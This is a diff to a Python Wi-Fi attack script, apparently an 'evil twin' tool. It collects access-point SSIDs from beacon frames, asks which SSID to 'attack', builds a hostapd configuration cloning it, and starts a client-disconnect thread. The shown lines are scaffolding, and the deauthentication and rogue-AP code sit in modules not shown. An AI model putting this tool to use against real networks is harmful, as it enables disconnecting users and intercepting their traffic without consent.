@@ -5,12 +5,14 @@ import threading
 import time
 import logging
 import MonitorMode as mm
+import createConf as cc
 import signal
 
 
 iface = ""
 users_list = []
 ap_list = []
+ssid_list = []
 ap_mac = ""
 
 def Wifi_scaning():
@@ -32,6 +34,7 @@ def AP_handler(pkt) :
     if pkt.haslayer(Dot11) and pkt.type == 0 and pkt.subtype == 8:
             if pkt.addr2 not in ap_list:
                 ap_list.append(pkt.addr2 )
+                ssid_list.append(pkt.info)
                 print(len(ap_list),'     %s     %s '%( pkt.addr2, pkt.info))
 
 
@@ -65,6 +68,8 @@ def main():
     if len(ap_list) > 0 :
         mac_adder = int(input("\nEnter the index of the ssid you want to attack: ")) -1
         ap_mac = ap_list[mac_adder]
+        ssid_name = ssid_list[mac_adder]
+        cc.Create_hostapd(iface, ssid_name)
         Users_scaning()
     #Choose user to attack
     if len(users_list) > 0 :
@@ -74,12 +79,13 @@ def main():
         disconnectThread.start()
         time.sleep(3)
         print("process keep going...")
-    while True:
-        try:
-            time.sleep(2) 
-        except KeyboardInterrupt:
-			break
-    mm.Change_back(iface)
+        while True:
+            try:
+                time.sleep(2) 
+            except KeyboardInterrupt:
+                break
+        mm.Change_back(iface)
+        os.system("rm hostapd.conf")
 
 
 if __name__ == "__main__":
